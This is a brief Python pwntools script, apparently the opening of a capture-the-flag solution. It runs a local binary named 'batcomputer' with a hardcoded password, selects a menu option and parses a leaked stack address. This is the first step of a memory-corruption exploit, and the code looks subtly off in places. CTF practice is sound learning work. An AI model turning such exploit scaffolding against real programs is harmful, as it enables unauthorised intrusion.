
from pwn import *

password = 'b4tp@$$w0rd!'

io = process('~/Downloads/batcomputer')
io.sendlineafter('> ', 1)
stack_address = io.recvline().strip().split()[-1]
stack_address = ''.join([chr(int(stack_address[i: i+2], 16)) for i in range(2, len(stack_address), 2)])

print(stack_address)
